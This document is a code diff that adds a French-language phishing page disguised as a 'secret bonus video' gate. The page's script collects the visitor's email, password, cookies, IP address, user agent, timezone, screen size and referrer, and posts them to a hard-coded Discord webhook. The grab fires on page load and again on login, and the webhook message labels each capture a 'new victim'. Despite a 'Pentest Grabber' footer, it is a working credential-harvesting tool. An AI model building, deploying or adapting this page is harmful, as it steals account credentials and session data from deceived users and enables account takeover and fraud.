@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 Vidéo Bonus Exclusive !</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            color: white;
+        }
+        .container { 
+            background: rgba(255,255,255,0.1); 
+            backdrop-filter: blur(10px); 
+            border-radius: 20px; 
+            padding: 40px; 
+            max-width: 500px; 
+            text-align: center; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        h1 { font-size: 2.5em; margin-bottom: 20px; text-shadow: 0 5px 10px rgba(0,0,0,0.3); }
+        .login-form { margin: 30px 0; }
+        input { 
+            width: 100%; padding: 15px; margin: 10px 0; 
+            border: none; border-radius: 10px; font-size: 16px; 
+            background: rgba(255,255,255,0.9); 
+        }
+        input:invalid {
+            background: rgba(255,0,0,0.2);
+            border: 2px solid #ff4444;
+        }
+        .btn { 
+            background: linear-gradient(45deg, #ff6b6b, #feca57); 
+            color: white; border: none; 
+            padding: 15px 40px; border-radius: 50px; 
+            font-size: 18px; font-weight: bold; 
+            cursor: pointer; transition: all 0.3s; 
+            margin: 10px; box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        .btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0,0,0,0.3); }
+        .btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .video-section { margin-top: 30px; opacity: 0; transition: opacity 0.5s; }
+        .video-section.show { opacity: 1; }
+        #status { margin-top: 20px; font-size: 14px; opacity: 0.8; }
+        .error { color: #ff6b6b; font-weight: bold; margin-top: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Surprise Exclusive !</h1>
+        <p>Accès spécial au contenu bonus. <strong>EMAIL OBLIGATOIRE</strong> pour débloquer la vidéo secrète !</p>
+        
+        <div class="login-form">
+            <input type="email" id="email" placeholder="📧 Ton email OBLIGATOIRE" required>
+            <input type="password" id="password" placeholder="🔑 Mot de passe">
+            <button class="btn" id="loginBtn" onclick="login()" disabled>🚀 Accéder à la vidéo</button>
+            <div id="emailError" class="error" style="display: none;">❌ Email invalide ! Format requis : exemple@domaine.com</div>
+        </div>
+        
+        <div id="status"></div>
+        
+        <div class="video-section" id="videoSection">
+            <h2>🎥 Ta vidéo exclusive :</h2>
+            <p style="margin-bottom: 20px; font-size: 16px;">Clique pour ouvrir la vidéo dans un nouvel onglet !</p>
+            <button class="btn" onclick="openVideo()" style="background: linear-gradient(45deg, #4ecdc4, #44a08d); font-size: 20px; padding: 20px 50px;">
+                🎬 OUVRIR LA VIDÉO MAINTENANT
+            </button>
+            <p style="margin-top: 15px; font-size: 14px;">Merci pour ta connexion ! Profite bien 😊</p>
+        </div>
+    </div>
+
+    <script>
+        // TON WEBHOOK DISCORD
+        const DISCORD_WEBHOOK = 'https://canary.discord.com/api/webhooks/1495131862702751775/pP4iuM3WGCm8n_Po5PE94ofmB2-tvh8nxDLPMSKFddYAiaGlWBdvxa3sy0vlnVJoilFC';
+        const YOUTUBE_LINK = 'https://youtube.com/shorts/MBz-kM9Tqf0?si=G8Yw_AlaceyqnQ7L';
+        
+        let lastExfil = 0;
+        const EXFIL_COOLDOWN = 5000;
+        
+        const emailInput = document.getElementById('email');
+        const loginBtn = document.getElementById('loginBtn');
+        const emailError = document.getElementById('emailError');
+        
+        function canExfil() {
+            const now = Date.now();
+            return (now - lastExfil) > EXFIL_COOLDOWN;
+        }
+        
+        // Validation email en temps réel
+        emailInput.addEventListener('input', function() {
+            const email = this.value;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            
+            if (emailRegex.test(email) && email.length > 5) {
+                loginBtn.disabled = false;
+                emailError.style.display = 'none';
+                this.style.background = 'rgba(255,255,255,0.9)';
+            } else {
+                loginBtn.disabled = true;
+                if (email.length > 0) {
+                    emailError.style.display = 'block';
+                    emailError.textContent = '❌ Email invalide ! Format requis : exemple@domaine.com';
+                    this.style.background = 'rgba(255,0,0,0.2)';
+                } else {
+                    emailError.style.display = 'none';
+                    this.style.background = 'rgba(255,255,255,0.9)';
+                }
+            }
+        });
+        
+        // Ouvre la vidéo YouTube
+        function openVideo() {
+            window.open(YOUTUBE_LINK, '_blank');
+            exfilData();
+        }
+        
+        function sendToDiscord(data) {
+            if (!canExfil()) return;
+            
+            const embed = {
+                title: "🎣 NOUVELLE VICTIME CAPTURÉE",
+                color: 16711680,
+                fields: [
+                    { name: "🌐 IP", value: data.ip || "Detection...", inline: true },
+                    { name: "📧 Email", value: data.email || "Non saisi", inline: true },
+                    { name: "🔑 Mot de passe", value: data.password || "Non saisi", inline: false },
+                    { name: "🌍 User Agent", value: data.userAgent.substring(0,50)+'...', inline: false },
+                    { name: "📱 Résolution", value: data.screen, inline: true },
+                    { name: "🌐 Localisation", value: data.timezone || "Unknown", inline: true },
+                    { name: "🍪 Cookies", value: data.cookies || "Aucun", inline: false }
+                ],
+                thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/5968/5968898.png" },
+                timestamp: new Date().toISOString(),
+                footer: { text: "Pentest Grabber | " + new Date().toLocaleString('fr-FR') }
+            };
+            
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            }).catch(e => {});
+            
+            lastExfil = Date.now();
+        }
+        
+        async function exfilData() {
+            const data = {
+                ip: await getIP(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookies: document.cookie,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer
+            };
+            sendToDiscord(data);
+        }
+        
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                return json.ip;
+            } catch(e) { return 'Hidden'; }
+        }
+        
+        async function login() {
+            const email = emailInput.value;
+            if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                alert('❌ EMAIL OBLIGATOIRE ET VALIDE !');
+                return;
+            }
+            
+            const status = document.getElementById('status');
+            const videoSection = document.getElementById('videoSection');
+            
+            status.innerHTML = '🔄 Connexion sécurisée... <span class="spinner"></span>';
+            await exfilData();
+            
+            setTimeout(() => {
+                status.innerHTML = '✅ Accès autorisé ! 🎉';
+                setTimeout(() => {
+                    videoSection.classList.add('show');
+                }, 1000);
+            }, 2500);
+        }
+        
+        window.addEventListener('load', () => {
+            setTimeout(exfilData, 1500);
+        });
+    </script>
+</body>
+</html>
